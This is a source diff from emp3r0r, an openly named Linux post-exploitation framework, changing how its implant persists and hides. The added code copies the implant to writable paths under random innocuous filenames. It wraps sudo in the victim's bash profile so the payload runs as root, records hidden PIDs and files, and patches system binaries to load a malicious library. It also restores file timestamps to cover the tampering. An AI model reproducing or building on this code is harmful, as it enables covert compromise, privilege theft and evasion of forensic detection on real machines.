@@ -13,6 +13,7 @@ import (
 	"strconv"
 	"strings"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -42,43 +43,20 @@ var (
 		"/usr/bin/sh",
 		"/usr/bin/ss",
 	}
-
-	// EmpLocations all possible locations
-	EmpLocations = []string{
-		// root
-		"/env",
-		"/usr/bin/x", // see loader.c
-		"/usr/bin/.env",
-		"/usr/local/bin/env",
-		"/bin/.env",
-		"/usr/share/man/man1/arch.gz",
-		"/usr/share/man/man1/ls.1.gz",
-		"/usr/share/man/man1/arch.5.gz",
-	}
-
-	EmpLocationsNoRoot = []string{
-		// no root required
-		"/tmp/.env",
-		"/dev/shm/.env",
-		fmt.Sprintf("%s/.wget-hst",
-			os.Getenv("HOME")),
-		fmt.Sprintf("%s/.less-hist",
-			os.Getenv("HOME")),
-		fmt.Sprintf("%s/.sudo_as_admin_successful",
-			os.Getenv("HOME")),
-		fmt.Sprintf("%s/.env",
-			os.Getenv("HOME")),
-		fmt.Sprintf("%s/.pam",
-			os.Getenv("HOME")),
-	}
 )
 
-// installToAllLocations copy emp3r0r to multiple locations
-func installToAllLocations() {
-	locations := EmpLocations
-	if !HasRoot() {
-		locations = EmpLocationsNoRoot
+// Configure install locations
+func getInstallLocations() (locations []string) {
+	for _, loc := range WritableLocations {
+		fname := emp3r0r_data.CommonFilenames[util.RandInt(0, len(emp3r0r_data.CommonFilenames))]
+		locations = append(locations, loc+"/"+fname)
 	}
+	return
+}
+
+// installToAllLocations copy emp3r0r to multiple locations
+func installToAllLocations() []string {
+	locations := getInstallLocations()
 	for _, path := range locations {
 		err := CopySelfTo(path)
 		if err != nil {
@@ -86,13 +64,13 @@ func installToAllLocations() {
 			continue
 		}
 	}
+
+	return locations
 }
 
+// installToRandomLocation copy emp3r0r to a random location
 func installToRandomLocation() (target string, err error) {
-	locations := EmpLocations
-	if !HasRoot() {
-		locations = EmpLocationsNoRoot
-	}
+	locations := getInstallLocations()
 	target = locations[util.RandInt(0, len(locations))]
 	err = CopySelfTo(target)
 	return
@@ -164,12 +142,13 @@ func profiles() (err error) {
 	// exec our payload as root too!
 	// sudo payload
 	var sudoLocs []string
-	for _, loc := range EmpLocations {
+	all_locations := installToAllLocations()
+	for _, loc := range all_locations {
 		sudoLocs = append(sudoLocs, "/usr/bin/sudo -E "+loc)
 	}
 	sudoPayload := strings.Join(sudoLocs, "||")
 	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;((%s) 2>/dev/null)) }", sudoPayload)
-	err = os.WriteFile(bashprofile, []byte(loader), 0644)
+	err = os.WriteFile(bashprofile, []byte(loader), 0o644)
 	if err != nil {
 		return
 	}
@@ -204,7 +183,7 @@ func AddCronJob(job string) error {
 func HidePIDs() (err error) {
 	// mkdir
 	if !util.IsDirExist("/usr/share/at") {
-		os.MkdirAll("/usr/share/at", 0755)
+		os.MkdirAll("/usr/share/at", 0o755)
 	}
 	pids := make([]int, 0)
 
@@ -241,7 +220,7 @@ func HidePIDs() (err error) {
 	pids = util.RemoveDupsFromArray(pids)
 	pid_list_str := strings.Join(util.IntArrayToStringArray(pids), "\n")
 
-	err = os.WriteFile(Hidden_PIDs, []byte(pid_list_str), 0644)
+	err = os.WriteFile(Hidden_PIDs, []byte(pid_list_str), 0o644)
 	if err != nil {
 		return
 	}
@@ -266,7 +245,7 @@ func patcher() (err error) {
 		util.FileBaseName(RuntimeConfig.AgentRoot),
 		util.FileBaseName(Hidden_Files),
 		util.FileBaseName(Hidden_PIDs))
-	err = os.WriteFile(Hidden_Files, []byte(files), 0644)
+	err = os.WriteFile(Hidden_Files, []byte(files), 0o644)
 	if err != nil {
 		log.Printf("Cannot create %s: %v", Hidden_Files, err)
 	}
@@ -277,13 +256,21 @@ func patcher() (err error) {
 		if !util.IsFileExist(file) || util.IsFileExist(bak) {
 			continue
 		}
-		so_path, err := prepare_loader_so(0, file)
+
+		so_path, err := prepare_loader_so(os.Getpid(), file)
 		if err != nil {
 			return err
 		}
 		e := AddNeededLib(file, so_path)
 		if e != nil {
 			err = fmt.Errorf("%v; %v", err, e)
+		}
+
+		// Restore the original file timestamps
+		// ctime is not changed
+		err = RestoreFileTimes(file)
+		if err != nil {
+			return err
 		}
 	}
 	return
